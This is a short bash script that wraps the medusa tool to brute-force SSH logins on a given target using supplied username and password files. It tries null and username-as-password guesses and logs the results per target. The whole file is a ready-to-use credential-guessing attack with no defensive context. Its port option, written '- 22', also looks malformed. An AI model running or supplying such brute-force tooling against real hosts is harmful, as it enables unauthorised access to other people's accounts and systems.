#!/usr/bin/env bash
if [ $# -ne 3 ]; then
    echo "[*] SSH medusa bruteforce"
    echo "[*] Usage : $0 <target> <user_file> <pass_file>"
    exit 0
fi
medusa -U $2 -P $3 -e ns -h $1 - 22 -M ssh > >(tee -a $1.medusa.stdout.log) 2> >(tee -a $1.medusa.stderr.log >&2)
